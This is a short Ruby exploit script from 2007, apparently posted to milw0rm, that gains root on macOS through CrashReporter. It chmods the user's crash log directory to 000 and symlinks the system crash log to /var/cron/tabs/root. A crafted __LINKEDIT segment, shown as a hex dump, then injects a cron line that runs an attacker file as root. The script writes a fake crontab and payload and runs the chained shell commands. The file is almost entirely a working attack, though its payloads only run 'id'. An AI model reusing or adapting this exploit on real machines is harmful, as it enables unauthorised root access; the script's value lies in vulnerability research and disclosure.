#!/usr/bin/ruby
# Copyright (c) 2007 Kevin Finisterre <kf_lists [at] digitalmunition.com>
#                    Lance M. Havok   <lmh [at] info-pull.com>
# All pwnage reserved.
#
# 1) Stop crashdump from writing to ~/Library/Logs via chmod 000 ~/Library/Logs/CrashReporter
# 2) Make symlink to /Library/Logs/CrashReporter/knownprog.crash.log
# 3) Create a program with a modified __LINKEDIT segment that influences crashreporter output 
#
# 0000320: 3800 0000 5f5f 4c49 4e4b 4544 4954 0000  8...__LINKEDIT..
# 0000330: 0000 0000 0040 0000 0010 0000 0030 0000  .....@.......0..
# 0000340: 2004 0000 0300 0000 0100 0000 0000 0000   ...............
# 0000350: 0400 0000 0e00 0000 1c00 0000 0c00 0000  ................
# 0000360: 2f75 7372 2f6c 6962 2f64 796c 6400 0000  /usr/lib/dyld...
# 0000370: 0c00 0000 3400 0000 1800 0000 68b7 9b45  ....4.......h..E
# 0000380: 0403 5800 0000 0100 0d0a 2a20 2a20 2a20  ..X.......* * * 
# 0000390: 2a20 2a20 2f74 6d70 2f78 0d0a 2e64 796c  * * /tmp/x...dyl
# 00003a0: 6962 0000 0200 0000 1800 0000 0030 0000  ib...........0..
#
# 4) Run the fake program which will crash and create /var/cron/tabs/root
# 5) Sleep and then create a legit crontab to refresh cron
 
SYMLINK_PATH  = "/Library/Logs/CrashReporter/vuln.crash.log"

PWNERCYCLE    = "ln -s /var/cron/tabs/root #{SYMLINK_PATH};"    +
                "chmod 000 ~/Library/Logs/CrashReporter/;"      +
                "crontab /tmp/fakecron;"                        +
                "chmod +x /Users/Shared/r00t; sleep 61; ./vuln;"

def escalate()
  puts "++ Fixing up a fake crontab"
  fakecron = File.new("/tmp/fakecron", "w")
  fakecron.print("* * * * * /usr/bin/id > /tmp/USERCRON\n")
  fakecron.close
  tmp_ex = File.new("/Users/Shared/r00t", "w")
  tmp_ex.print("/usr/bin/id > /tmp/CRASHREPOWNED\n")
  tmp_ex.close

  system PWNERCYCLE
end

escalate()

# milw0rm.com [2007-01-29]
